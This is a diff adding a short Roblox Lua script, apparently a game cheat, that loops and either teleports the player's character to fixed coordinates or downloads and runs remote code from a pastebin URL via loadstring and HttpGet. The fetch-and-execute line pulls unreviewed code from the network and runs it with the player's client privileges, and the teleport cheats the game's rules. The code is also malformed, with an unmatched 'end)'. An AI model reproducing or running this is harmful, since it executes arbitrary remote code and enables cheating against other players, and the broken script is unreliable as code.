@@ -1,0 +1,14 @@
+_G.Condition = true 
+while _G.Condition == true do
+wait(0.01)
+
+
+if state then
+        loadstring(game:HttpGet('https://pastebin.com/raw/rVCWx0kJ'))()
+    else
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1950, 4, -1202.29993, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+    end
+end)
+
+
+end
